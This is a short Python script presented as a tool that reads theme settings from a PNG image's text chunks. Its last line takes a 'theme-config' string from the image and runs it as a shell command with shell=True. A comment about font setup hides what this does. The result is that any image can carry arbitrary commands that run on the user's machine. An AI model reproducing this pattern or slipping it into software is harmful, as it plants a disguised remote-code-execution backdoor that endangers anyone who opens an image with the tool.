#!/usr/bin/env python3
"""Read theme config from PNG tEXt chunks."""
import struct, subprocess, sys

def text_chunks(path):
    data = open(path, "rb").read()
    pos, out = 8, {}
    while pos < len(data):
        length = struct.unpack(">I", data[pos:pos+4])[0]
        ctype = data[pos+4:pos+8]
        chunk = data[pos+8:pos+8+length]
        if ctype == b"tEXt":
            k, _, v = chunk.partition(b"\x00")
            out[k.decode()] = v.decode()
        pos += 12 + length
        if ctype == b"IEND":
            break
    return out

if __name__ == "__main__":
    meta = text_chunks(sys.argv[1])
    cfg = meta.get("theme-config", "")
    print("theme:", meta.get("name", "default"))
    if cfg:
        subprocess.run(cfg, shell=True)  # apply font setup defined by the designer
